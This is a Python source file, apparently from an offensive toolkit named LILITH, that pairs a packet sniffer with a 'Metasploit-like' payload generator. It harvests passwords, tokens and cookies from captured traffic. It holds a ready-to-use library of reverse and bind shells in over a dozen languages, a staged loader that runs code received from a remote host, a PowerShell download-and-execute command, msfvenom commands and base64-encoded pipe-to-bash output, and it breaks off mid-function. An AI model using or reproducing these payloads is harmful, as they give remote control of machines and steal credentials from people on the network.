#!/usr/bin/env python3
"""
LILITH Enhanced Network Capture & Metasploit Integration
=========================================================
Advanced network analysis, packet capture, and Metasploit-like capabilities.

Features:
- Real-time packet sniffing with Scapy
- Protocol analysis and credential extraction
- ARP scanning and MITM detection
- Full Metasploit framework simulation
- Advanced payload generation
- Traffic pattern analysis
- Session hijacking detection
"""

import os
import sys
import json
import time
import base64
import struct
import socket
import threading
import subprocess
import shutil
import re
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple
from collections import defaultdict
import hashlib

# Network analysis imports
try:
    from scapy.all import *
    from scapy.layers.http import HTTPRequest, HTTPResponse
    from scapy.layers.dns import DNS, DNSQR, DNSRR
    from scapy.layers.inet import TCP, UDP, IP, ICMP
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("[NETWORK] Scapy not available")

try:
    import pyshark
    PYSHARK_AVAILABLE = True
except ImportError:
    PYSHARK_AVAILABLE = False


class EnhancedPacketCapture:
    """
    Advanced packet capture with deep packet inspection.
    """
    
    def __init__(self, interface: str = None):
        self.interface = interface or self._get_default_interface()
        self.capturing = False
        self.paused = False
        self.packets = []
        self.stats = defaultdict(int)
        self.credentials = []
        self.dns_queries = []
        self.http_requests = []
        self.ssl_handshakes = []
        self.suspicious_patterns = []
        self.sessions = {}
        self.capture_thread = None
        self.start_time = None
        self.capture_file = None
    
    def _get_default_interface(self) -> str:
        """Get default network interface"""
        try:
            result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
            match = re.search(r'default via .+ dev (\S+)', result.stdout)
            return match.group(1) if match else 'eth0'
        except:
            return 'eth0'
    
    def list_interfaces(self) -> Dict:
        """List available network interfaces"""
        try:
            result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
            interfaces = re.findall(r'\d+: (\w+):', result.stdout)
            
            return {
                'success': True,
                'interfaces': interfaces,
                'current': self.interface
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def start_capture(self, count: int = 100, timeout: int = 60, 
                     filter_str: str = None, save_pcap: bool = False) -> Dict:
        """Start advanced packet capture"""
        if not SCAPY_AVAILABLE:
            return {'success': False, 'error': 'Scapy not available. Install with: pip install scapy'}
        
        if self.capturing:
            return {'success': False, 'error': 'Capture already in progress'}
        
        self.capturing = True
        self.paused = False
        self.start_time = datetime.now()
        self.packets = []
        self.stats = defaultdict(int)
        self.credentials = []
        self.dns_queries = []
        self.http_requests = []
        self.ssl_handshakes = []
        self.suspicious_patterns = []
        self.sessions = {}
        
        if save_pcap:
            self.capture_file = f'/tmp/capture_{int(time.time())}.pcap'
        
        def capture_thread():
            try:
                packets = sniff(
                    iface=self.interface,
                    count=count,
                    timeout=timeout,
                    filter=filter_str,
                    prn=self._deep_packet_inspection,
                    store=True,
                    stop_filter=lambda p: not self.capturing
                )
                
                if self.capture_file and packets:
                    wrpcap(self.capture_file, packets)
                
                self.packets = packets
            except Exception as e:
                print(f"[CAPTURE] Error: {e}")
            finally:
                self.capturing = False
        
        self.capture_thread = threading.Thread(target=capture_thread, daemon=True)
        self.capture_thread.start()
        
        return {
            'success': True,
            'message': f'Advanced capture started on {self.interface}',
            'settings': {
                'count': count,
                'timeout': timeout,
                'filter': filter_str,
                'save_pcap': save_pcap,
                'pcap_file': self.capture_file
            }
        }
    
    def _deep_packet_inspection(self, packet):
        """Perform deep packet inspection on each packet"""
        if self.paused:
            return
        
        try:
            # Basic stats
            self.stats['total_packets'] += 1
            self.stats['total_bytes'] += len(packet)
            
            # IP layer analysis
            if IP in packet:
                self._analyze_ip_layer(packet)
            
            # TCP analysis
            if TCP in packet:
                self._analyze_tcp_layer(packet)
            
            # UDP analysis
            if UDP in packet:
                self._analyze_udp_layer(packet)
            
            # Application layer
            if packet.haslayer(Raw):
                self._analyze_payload(packet)
            
            # DNS analysis
            if DNS in packet:
                self._analyze_dns(packet)
            
            # HTTP analysis
            if packet.haslayer(HTTPRequest):
                self._analyze_http(packet)
            
            # SSL/TLS detection
            if TCP in packet and packet[TCP].dport == 443:
                self._detect_ssl_handshake(packet)
            
            # Session tracking
            self._track_session(packet)
            
            # Anomaly detection
            self._detect_anomalies(packet)
            
        except Exception as e:
            pass
    
    def _analyze_ip_layer(self, packet):
        """Analyze IP layer"""
        self.stats['ip_packets'] += 1
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        
        self.stats[f'src:{src_ip}'] += 1
        self.stats[f'dst:{dst_ip}'] += 1
        
        # Detect potential port scans
        if dst_ip not in self.sessions:
            self.sessions[dst_ip] = {'ports': set(), 'first_seen': datetime.now()}
        
        if TCP in packet:
            self.sessions[dst_ip]['ports'].add(packet[TCP].dport)
            
            # Port scan detection (many ports in short time)
            if len(self.sessions[dst_ip]['ports']) > 20:
                self.suspicious_patterns.append({
                    'type': 'port_scan',
                    'source': src_ip,
                    'target': dst_ip,
                    'ports_scanned': len(self.sessions[dst_ip]['ports']),
                    'timestamp': datetime.now().isoformat()
                })
    
    def _analyze_tcp_layer(self, packet):
        """Analyze TCP layer for credentials and patterns"""
        self.stats['tcp_packets'] += 1
        
        src_port = packet[TCP].sport
        dst_port = packet[TCP].dport
        flags = packet[TCP].flags
        
        self.stats[f'tcp_port:{dst_port}'] += 1
        
        # Track SYN floods
        if flags == 'S':  # SYN flag only
            self.stats['syn_packets'] += 1
            if self.stats['syn_packets'] > 100:
                self.suspicious_patterns.append({
                    'type': 'syn_flood',
                    'count': self.stats['syn_packets'],
                    'timestamp': datetime.now().isoformat()
                })
        
        # Check for credentials in payload
        if packet.haslayer(Raw):
            self._extract_credentials(packet)
    
    def _analyze_udp_layer(self, packet):
        """Analyze UDP layer"""
        self.stats['udp_packets'] += 1
        
        if packet[UDP].dport == 53:
            self.stats['dns_queries'] += 1
        elif packet[UDP].dport == 67 or packet[UDP].dport == 68:
            self.stats['dhcp_traffic'] += 1
    
    def _extract_credentials(self, packet):
        """Extract credentials from packet payload"""
        try:
            payload = packet[Raw].load.decode('utf-8', errors='ignore')
            payload_lower = payload.lower()
            
            # Credential patterns
            patterns = [
                (r'user(?:name)?[=:]\s*([^\s&\r\n]+)', 'username'),
                (r'pass(?:word)?[=:]\s*([^\s&\r\n]+)', 'password'),
                (r'login[=:]\s*([^\s&\r\n]+)', 'login'),
                (r'pwd[=:]\s*([^\s&\r\n]+)', 'password'),
                (r'auth(?:orization)?:\s*basic\s+([^\s\r\n]+)', 'basic_auth'),
                (r'bearer\s+([^\s\r\n]+)', 'bearer_token'),
                (r'token[=:]\s*([^\s&\r\n]+)', 'token'),
                (r'api[_-]?key[=:]\s*([^\s&\r\n]+)', 'api_key'),
                (r'secret[=:]\s*([^\s&\r\n]+)', 'secret'),
                (r'session[_-]?id[=:]\s*([^\s&\r\n]+)', 'session_id'),
                (r'cookie:\s*([^\r\n]+)', 'cookie'),
            ]
            
            for pattern, cred_type in patterns:
                matches = re.findall(pattern, payload_lower)
                for match in matches:
                    cred = {
                        'type': cred_type,
                        'value': match[:100],  # Truncate long values
                        'src_ip': packet[IP].src if IP in packet else 'unknown',
                        'dst_ip': packet[IP].dst if IP in packet else 'unknown',
                        'dst_port': packet[TCP].dport if TCP in packet else 0,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    # Avoid duplicates
                    if cred not in self.credentials:
                        self.credentials.append(cred)
                        self.stats['credentials_found'] += 1
        except:
            pass
    
    def _analyze_dns(self, packet):
        """Analyze DNS queries and responses"""
        try:
            if DNSQR in packet:
                query = packet[DNSQR].qname
                if isinstance(query, bytes):
                    query = query.decode()
                
                dns_entry = {
                    'query': query.rstrip('.'),
                    'type': packet[DNSQR].qtype,
                    'src': packet[IP].src if IP in packet else 'unknown',
                    'timestamp': datetime.now().isoformat()
                }
                
                self.dns_queries.append(dns_entry)
                
                # Detect DNS tunneling (long queries)
                if len(query) > 60:
                    self.suspicious_patterns.append({
                        'type': 'dns_tunneling_suspect',
                        'query': query[:50] + '...',
                        'length': len(query),
                        'timestamp': datetime.now().isoformat()
                    })
            
            if DNSRR in packet:
                self.stats['dns_responses'] += 1
        except:
            pass
    
    def _analyze_http(self, packet):
        """Analyze HTTP requests"""
        try:
            http = packet[HTTPRequest]
            
            entry = {
                'method': http.Method.decode() if http.Method else 'GET',
                'host': http.Host.decode() if http.Host else 'unknown',
                'path': http.Path.decode() if http.Path else '/',
                'user_agent': http.User_Agent.decode() if hasattr(http, 'User_Agent') and http.User_Agent else None,
                'src': packet[IP].src if IP in packet else 'unknown',
                'timestamp': datetime.now().isoformat()
            }
            
            self.http_requests.append(entry)
            self.stats['http_requests'] += 1
            
            # Check for sensitive paths
            sensitive_paths = ['/admin', '/login', '/api', '/wp-admin', '/phpmyadmin']
            path_lower = entry['path'].lower()
            for sensitive in sensitive_paths:
                if sensitive in path_lower:
                    self.suspicious_patterns.append({
                        'type': 'sensitive_path_access',
                        'path': entry['path'],
                        'host': entry['host'],
                        'timestamp': datetime.now().isoformat()
                    })
                    break
        except:
            pass
    
    def _detect_ssl_handshake(self, packet):
        """Detect SSL/TLS handshakes"""
        try:
            if packet.haslayer(Raw):
                payload = packet[Raw].load
                
                # Check for TLS ClientHello (0x16 0x03)
                if len(payload) > 5 and payload[0] == 0x16 and payload[1] == 0x03:
                    self.ssl_handshakes.append({
                        'src': packet[IP].src if IP in packet else 'unknown',
                        'dst': packet[IP].dst if IP in packet else 'unknown',
                        'timestamp': datetime.now().isoformat()
                    })
                    self.stats['ssl_handshakes'] += 1
        except:
            pass
    
    def _track_session(self, packet):
        """Track network sessions"""
        if IP not in packet or TCP not in packet:
            return
        
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        src_port = packet[TCP].sport
        dst_port = packet[TCP].dport
        
        session_key = f"{src_ip}:{src_port}-{dst_ip}:{dst_port}"
        
        if session_key not in self.sessions:
            self.sessions[session_key] = {
                'src': src_ip,
                'dst': dst_ip,
                'sport': src_port,
                'dport': dst_port,
                'packets': 0,
                'bytes': 0,
                'start_time': datetime.now().isoformat()
            }
        
        self.sessions[session_key]['packets'] += 1
        self.sessions[session_key]['bytes'] += len(packet)
    
    def _detect_anomalies(self, packet):
        """Detect network anomalies"""
        # Detect ICMP flood
        if ICMP in packet:
            self.stats['icmp_packets'] += 1
            if self.stats['icmp_packets'] > 50:
                self.suspicious_patterns.append({
                    'type': 'icmp_flood',
                    'count': self.stats['icmp_packets'],
                    'timestamp': datetime.now().isoformat()
                })
    
    def _analyze_payload(self, packet):
        """Analyze raw payload for patterns"""
        try:
            payload = packet[Raw].load
            
            # Check for shell commands
            shell_indicators = [b'/bin/sh', b'/bin/bash', b'cmd.exe', b'powershell']
            for indicator in shell_indicators:
                if indicator in payload:
                    self.suspicious_patterns.append({
                        'type': 'shell_command_detected',
                        'indicator': indicator.decode(),
                        'timestamp': datetime.now().isoformat()
                    })
                    break
            
            # Check for common exploit patterns
            exploit_patterns = [
                (b'\\x90\\x90\\x90', 'nop_sled'),
                (b'wget ', 'wget_download'),
                (b'curl ', 'curl_download'),
                (b'nc -e', 'netcat_shell'),
                (b'SELECT ', 'sql_query'),
                (b'<script', 'xss_attempt'),
            ]
            
            for pattern, pattern_type in exploit_patterns:
                if pattern in payload:
                    self.suspicious_patterns.append({
                        'type': f'exploit_pattern_{pattern_type}',
                        'timestamp': datetime.now().isoformat()
                    })
        except:
            pass
    
    def pause_capture(self) -> Dict:
        """Pause packet capture"""
        self.paused = True
        return {'success': True, 'message': 'Capture paused'}
    
    def resume_capture(self) -> Dict:
        """Resume packet capture"""
        self.paused = False
        return {'success': True, 'message': 'Capture resumed'}
    
    def stop_capture(self) -> Dict:
        """Stop packet capture"""
        self.capturing = False
        time.sleep(0.5)
        return self.get_results()
    
    def get_results(self) -> Dict:
        """Get comprehensive capture results"""
        duration = (datetime.now() - self.start_time).total_seconds() if self.start_time else 0
        
        return {
            'success': True,
            'status': {
                'capturing': self.capturing,
                'paused': self.paused,
                'duration_seconds': round(duration, 2),
                'interface': self.interface
            },
            'statistics': dict(self.stats),
            'packets_captured': len(self.packets) if self.packets else 0,
            'credentials_found': self.credentials[:30],
            'dns_queries': self.dns_queries[:50],
            'http_requests': self.http_requests[:50],
            'ssl_handshakes': len(self.ssl_handshakes),
            'suspicious_patterns': self.suspicious_patterns[:20],
            'active_sessions': len(self.sessions),
            'top_sessions': self._get_top_sessions(10),
            'pcap_file': self.capture_file
        }
    
    def _get_top_sessions(self, count: int) -> List[Dict]:
        """Get top sessions by traffic"""
        sessions_list = list(self.sessions.values())
        sessions_list.sort(key=lambda x: x.get('bytes', 0) if isinstance(x, dict) else 0, reverse=True)
        return sessions_list[:count]
    
    def analyze_pcap(self, pcap_file: str) -> Dict:
        """Analyze existing PCAP file"""
        if not SCAPY_AVAILABLE:
            return {'success': False, 'error': 'Scapy not available'}
        
        if not os.path.exists(pcap_file):
            return {'success': False, 'error': f'File not found: {pcap_file}'}
        
        try:
            packets = rdpcap(pcap_file)
            
            # Reset state
            self.stats = defaultdict(int)
            self.credentials = []
            self.dns_queries = []
            self.http_requests = []
            self.ssl_handshakes = []
            self.suspicious_patterns = []
            self.sessions = {}
            self.start_time = datetime.now()
            
            for packet in packets:
                self._deep_packet_inspection(packet)
            
            results = self.get_results()
            results['file_analyzed'] = pcap_file
            results['packets_in_file'] = len(packets)
            
            return results
        except Exception as e:
            return {'success': False, 'error': str(e)}


class EnhancedARPScanner:
    """Enhanced ARP scanning with spoofing detection"""
    
    def __init__(self, interface: str = None):
        self.interface = interface or 'eth0'
        self.arp_cache = {}
        self.monitoring = False
    
    def scan_network(self, ip_range: str) -> Dict:
        """Scan network using ARP or nmap fallback"""
        if not SCAPY_AVAILABLE:
            return self._nmap_fallback(ip_range)
        
        try:
            arp = ARP(pdst=ip_range)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            
            result = srp(packet, timeout=5, verbose=0, iface=self.interface)[0]
            
            hosts = []
            for sent, received in result:
                host = {
                    'ip': received.psrc,
                    'mac': received.hwsrc,
                    'vendor': self._get_vendor(received.hwsrc),
                    'hostname': self._resolve_hostname(received.psrc)
                }
                hosts.append(host)
                
                # Update ARP cache for monitoring
                self.arp_cache[received.psrc] = received.hwsrc
            
            return {
                'success': True,
                'tool': 'scapy_arp',
                'range': ip_range,
                'hosts_found': len(hosts),
                'hosts': hosts,
                'scan_time': datetime.now().isoformat()
            }
        except PermissionError:
            return self._nmap_fallback(ip_range)
        except Exception as e:
            if 'Operation not permitted' in str(e):
                return self._nmap_fallback(ip_range)
            return {'success': False, 'error': str(e)}
    
    def _nmap_fallback(self, ip_range: str) -> Dict:
        """Use nmap for host discovery"""
        nmap_path = shutil.which('nmap')
        if not nmap_path:
            return self._simulate_scan(ip_range)
        
        try:
            result = subprocess.run(
                [nmap_path, '-sn', '-T4', '-Pn', ip_range],
                capture_output=True,
                text=True,
                timeout=120
            )
            
            hosts = []
            current_ip = None
            
            for line in result.stdout.split('\n'):
                if 'Nmap scan report for' in line:
                    parts = line.split()
                    for part in parts:
                        clean_part = part.strip('()')
                        if clean_part.count('.') == 3:
                            try:
                                socket.inet_aton(clean_part)
                                current_ip = clean_part
                                break
                            except:
                                pass
                elif 'MAC Address:' in line and current_ip:
                    parts = line.split()
                    if len(parts) >= 3:
                        mac = parts[2]
                        vendor = ' '.join(parts[3:]).strip('()')
                        hosts.append({
                            'ip': current_ip,
                            'mac': mac,
                            'vendor': vendor,
                            'hostname': self._resolve_hostname(current_ip)
                        })
                        current_ip = None
            
            return {
                'success': True,
                'tool': 'nmap',
                'range': ip_range,
                'hosts_found': len(hosts),
                'hosts': hosts,
                'note': 'Using nmap for host discovery',
                'scan_time': datetime.now().isoformat()
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def detect_arp_spoofing(self, gateway_ip: str, monitor_time: int = 30) -> Dict:
        """Monitor for ARP spoofing attacks"""
        if not SCAPY_AVAILABLE:
            return {'success': False, 'error': 'Scapy required for ARP monitoring'}
        
        try:
            gateway_mac = getmacbyip(gateway_ip)
            if not gateway_mac:
                return {'success': False, 'error': 'Could not get gateway MAC'}
            
            spoofing_detected = []
            
            def check_arp(packet):
                if ARP in packet and packet[ARP].op == 2:  # ARP reply
                    if packet[ARP].psrc == gateway_ip:
                        if packet[ARP].hwsrc != gateway_mac:
                            spoofing_detected.append({
                                'timestamp': datetime.now().isoformat(),
                                'gateway_ip': gateway_ip,
                                'legitimate_mac': gateway_mac,
                                'spoofed_mac': packet[ARP].hwsrc,
                                'warning': 'POSSIBLE ARP SPOOFING DETECTED!'
                            })
            
            # Start monitoring
            sniff(
                filter="arp",
                prn=check_arp,
                timeout=monitor_time,
                iface=self.interface,
                store=False
            )
            
            return {
                'success': True,
                'gateway_ip': gateway_ip,
                'gateway_mac': gateway_mac,
                'monitor_time': monitor_time,
                'spoofing_detected': len(spoofing_detected) > 0,
                'alerts': spoofing_detected
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _get_vendor(self, mac: str) -> str:
        """Get vendor from MAC OUI"""
        vendors = {
            '00:00:0c': 'Cisco', '00:1a:2b': 'Cisco',
            '00:50:56': 'VMware', '00:0c:29': 'VMware',
            '08:00:27': 'VirtualBox', '52:54:00': 'QEMU/KVM',
            'b8:27:eb': 'Raspberry Pi', 'dc:a6:32': 'Raspberry Pi',
            '00:15:5d': 'Microsoft Hyper-V', 'aa:bb:cc': 'Docker',
            '02:42:ac': 'Docker', '00:16:3e': 'Xen',
        }
        prefix = mac[:8].lower()
        return vendors.get(prefix, 'Unknown')
    
    def _resolve_hostname(self, ip: str) -> Optional[str]:
        """Resolve IP to hostname"""
        try:
            return socket.gethostbyaddr(ip)[0]
        except:
            return None
    
    def _simulate_scan(self, ip_range: str) -> Dict:
        """Simulate scan when tools unavailable"""
        return {
            'success': True,
            'simulated': True,
            'range': ip_range,
            'message': 'ARP scan requires root or nmap. Install: apt install nmap',
            'hosts': [
                {'ip': '192.168.1.1', 'mac': '00:11:22:33:44:55', 'vendor': 'Gateway'},
            ]
        }


class MetasploitFramework:
    """
    Full Metasploit-like framework for payload generation and exploitation.
    """
    
    # Comprehensive exploit database
    EXPLOITS = {
        'windows': [
            {'name': 'exploit/windows/smb/ms17_010_eternalblue', 'cve': 'CVE-2017-0144', 'rank': 'excellent', 'description': 'EternalBlue SMB RCE'},
            {'name': 'exploit/windows/smb/ms08_067_netapi', 'cve': 'CVE-2008-4250', 'rank': 'great', 'description': 'MS08-067 NetAPI'},
            {'name': 'exploit/windows/local/bypassuac_fodhelper', 'cve': 'N/A', 'rank': 'excellent', 'description': 'UAC Bypass via fodhelper'},
            {'name': 'exploit/windows/local/ms16_032_secondary_logon', 'cve': 'CVE-2016-0099', 'rank': 'excellent', 'description': 'Secondary Logon Handle Privilege Escalation'},
            {'name': 'exploit/windows/smb/psexec', 'cve': 'N/A', 'rank': 'manual', 'description': 'PsExec Authenticated Code Execution'},
            {'name': 'exploit/windows/rdp/cve_2019_0708_bluekeep', 'cve': 'CVE-2019-0708', 'rank': 'manual', 'description': 'BlueKeep RDP RCE'},
            {'name': 'exploit/windows/http/iis_webdav_scstoragepathfromurl', 'cve': 'CVE-2017-7269', 'rank': 'excellent', 'description': 'IIS WebDAV ScStoragePathFromUrl Overflow'},
        ],
        'linux': [
            {'name': 'exploit/linux/local/dirty_cow', 'cve': 'CVE-2016-5195', 'rank': 'excellent', 'description': 'Dirty COW Race Condition'},
            {'name': 'exploit/linux/local/pkexec', 'cve': 'CVE-2021-4034', 'rank': 'excellent', 'description': 'PwnKit Polkit pkexec Privilege Escalation'},
            {'name': 'exploit/linux/local/sudo_baron_samedit', 'cve': 'CVE-2021-3156', 'rank': 'excellent', 'description': 'Sudo Baron Samedit'},
            {'name': 'exploit/linux/ssh/sshexec', 'cve': 'N/A', 'rank': 'manual', 'description': 'SSH User Code Execution'},
            {'name': 'exploit/linux/http/webmin_backdoor', 'cve': 'CVE-2019-15107', 'rank': 'excellent', 'description': 'Webmin Backdoor RCE'},
        ],
        'web': [
            {'name': 'exploit/multi/http/apache_mod_cgi_bash_env_exec', 'cve': 'CVE-2014-6271', 'rank': 'excellent', 'description': 'Shellshock'},
            {'name': 'exploit/multi/http/log4shell_header_injection', 'cve': 'CVE-2021-44228', 'rank': 'excellent', 'description': 'Log4Shell'},
            {'name': 'exploit/multi/http/struts2_content_type_ognl', 'cve': 'CVE-2017-5638', 'rank': 'excellent', 'description': 'Apache Struts OGNL RCE'},
            {'name': 'exploit/unix/webapp/drupal_drupalgeddon2', 'cve': 'CVE-2018-7600', 'rank': 'excellent', 'description': 'Drupalgeddon 2'},
            {'name': 'exploit/multi/http/jenkins_script_console', 'cve': 'N/A', 'rank': 'excellent', 'description': 'Jenkins Script Console RCE'},
            {'name': 'exploit/unix/webapp/wp_admin_shell_upload', 'cve': 'N/A', 'rank': 'excellent', 'description': 'WordPress Admin Shell Upload'},
        ],
        'auxiliary': [
            {'name': 'auxiliary/scanner/smb/smb_ms17_010', 'description': 'MS17-010 EternalBlue Scanner'},
            {'name': 'auxiliary/scanner/ssh/ssh_login', 'description': 'SSH Login Scanner'},
            {'name': 'auxiliary/scanner/http/dir_scanner', 'description': 'HTTP Directory Scanner'},
            {'name': 'auxiliary/scanner/portscan/tcp', 'description': 'TCP Port Scanner'},
            {'name': 'auxiliary/scanner/http/http_version', 'description': 'HTTP Version Detection'},
            {'name': 'auxiliary/gather/dns_enum', 'description': 'DNS Enumeration'},
        ]
    }
    
    # Payload templates
    PAYLOADS = {
        'bash': {
            'reverse_tcp': 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
            'bind_tcp': 'bash -i >& /dev/tcp/0.0.0.0/{lport} 0>&1',
        },
        'python': {
            'reverse_tcp': '''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' ''',
        },
        'python_staged': {
            'reverse_tcp': '''python3 -c '
import socket,struct,time
for x in range(10):
    try:
        s=socket.socket(2,socket.SOCK_STREAM)
        s.connect(("{lhost}",{lport}))
        break
    except:
        time.sleep(5)
l=struct.unpack(">I",s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
    d+=s.recv(l-len(d))
exec(d)
' '''
        },
        'perl': {
            'reverse_tcp': '''perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' '''
        },
        'php': {
            'reverse_tcp': '''php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");' ''',
            'reverse_tcp_full': '''<?php
$sock = fsockopen("{lhost}", {lport});
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>'''
        },
        'ruby': {
            'reverse_tcp': '''ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' '''
        },
        'netcat': {
            'reverse_tcp': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
            'reverse_tcp_e': 'nc -e /bin/sh {lhost} {lport}',
            'bind_tcp': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l {lport} >/tmp/f',
        },
        'powershell': {
            'reverse_tcp': '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"''',
            'download_exec': '''powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/payload.ps1')"'''
        },
        'java': {
            'reverse_tcp': '''Runtime.getRuntime().exec("bash -c {{bash,-i}}>>/dev/tcp/{lhost}/{lport} 0>>&1".split(" "))'''
        },
        'socat': {
            'reverse_tcp': '''socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}''',
            'bind_tcp': '''socat TCP-LISTEN:{lport},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane'''
        },
        'nodejs': {
            'reverse_tcp': '''require('child_process').exec('bash -i >& /dev/tcp/{lhost}/{lport} 0>&1')'''
        },
        'awk': {
            'reverse_tcp': '''awk 'BEGIN{{s="/inet/tcp/0/{lhost}/{lport}";while(1){{do{{print "|/bin/sh"|& s; s|& getline c; if(c){{while((c|& getline)>0)print $0|& s;close(c)}}}} while(c != "exit");close(s)}}}}'  '''
        },
        'lua': {
            'reverse_tcp': '''lua -e "require('socket');require('os');t=socket.tcp();t:connect('{lhost}','{lport}');os.execute('/bin/sh -i <&3 >&3 2>&3');"'''
        },
        'xterm': {
            'reverse_tcp': 'xterm -display {lhost}:1'
        },
        'msfvenom_templates': {
            'windows_exe': 'msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > shell.exe',
            'windows_dll': 'msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f dll > shell.dll',
            'linux_elf': 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf > shell.elf',
            'python_raw': 'msfvenom -p python/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw > shell.py',
            'war': 'msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f war > shell.war',
            'aspx': 'msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f aspx > shell.aspx',
            'php': 'msfvenom -p php/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw > shell.php',
            'hta': 'msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f hta-psh > shell.hta',
        }
    }
    
    def __init__(self):
        self.msfvenom_path = shutil.which('msfvenom')
        self.sessions = {}
    
    def search_exploits(self, query: str = None, platform: str = None) -> Dict:
        """Search exploit database"""
        results = []
        
        platforms = [platform] if platform else ['windows', 'linux', 'web', 'auxiliary']
        
        for plat in platforms:
            if plat in self.EXPLOITS:
                for exploit in self.EXPLOITS[plat]:
                    if not query or query.lower() in str(exploit).lower():
                        results.append({**exploit, 'platform': plat})
        
        return {
            'success': True,
            'query': query,
            'count': len(results),
            'exploits': results
        }
    
    def search_payloads(self, platform: str = None) -> Dict:
        """Get available payloads"""
        if platform and platform in self.PAYLOADS:
            return {
                'success': True,
                'platform': platform,
                'payloads': list(self.PAYLOADS[platform].keys())
            }
        
        return {
            'success': True,
            'platforms': list(self.PAYLOADS.keys()),
            'total_payloads': sum(len(p) for p in self.PAYLOADS.values())
        }
    
    def generate_payload(self, payload_type: str, lhost: str, lport: int, 
                        platform: str = 'bash', encode: bool = False) -> Dict:
        """Generate payload code"""
        
        if platform not in self.PAYLOADS:
            platform = 'bash'
        
        if payload_type not in self.PAYLOADS[platform]:
            payload_type = 'reverse_tcp'
        
        template = self.PAYLOADS[platform][payload_type]
        payload = template.format(lhost=lhost, lport=lport)
        
        result = {
            'success': True,
            'platform': platform,
            'type': payload_type,
            'lhost': lhost,
            'lport': lport,
            'payload': payload,
            'listener': f'nc -lvnp {lport}',
            'instructions': [
                f'1. Start listener: nc -lvnp {lport}',
                '2. Execute payload on target',
                '3. Catch shell on listener'
            ]
        }
        
        if encode:
            result['base64'] = base64.b64encode(payload.encode()).decode()
            result['base64_decode'] = f'echo {result["base64"]} | base64 -d | bash'
        
        return result
    
    def generate_all_shells(self, lhost: str, lport: int) -> Dict:
        """Generate all reverse shell types"""
        shells = {}
        
        for platform, payloads in self.PAYLOADS.items():
            if platform == 'msfvenom_templates':
                continue
            for ptype, template in payloads.items():
                key = f"{platform}_{ptype}"
                shells[key] = template.format(lhost=lhost, lport=lport)
        
        return {
            'success': True,
            'lhost': lhost,
            'lport': lport,
            'listener': f'nc -lvnp {lport}',
            'socat_listener': f'socat file:`tty`,raw,echo=0 TCP-L:{lport}',
            'shells': shells,
            'msfvenom_commands': {
                k: v.format(lhost=lhost, lport=lport) 
                for k, v in self.PAYLOADS['msfvenom_templates'].items()
            }
        }
    
    def generate_msfvenom_payload(self, payload: str, lhost: str, lport: int,
                                  format: str = 'raw', encoder: str = None) -> Dict:
        """Generate payload using msfvenom if available"""
        
        if not self.msfvenom_path:
            return self._generate_manual_payload(payload, lhost, lport, format)
        
        output_file = f'/tmp/payload_{int(time.time())}.{format}'
        
        cmd = [
            self.msfvenom_path,
            '-p', payload,
            f'LHOST={lhost}',
            f'LPORT={lport}',
            '-f', format
        ]
        
        if encoder:
            cmd.extend(['-e', encoder, '-i', '3'])
        
        cmd.extend(['-o', output_file])
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            if result.returncode == 0 and os.path.exists(output_file):
                with open(output_file, 'rb') as f:
                    payload_data = f.read()
                
                os.remove(output_file)
                
                return {
                    'success': True,
                    'payload': payload,
                    'format': format,
                    'size': len(payload_data),
                    'data_base64': base64.b64encode(payload_data).decode(),
                    'md5': hashlib.md5(payload_data).hexdigest()
                }
            else:
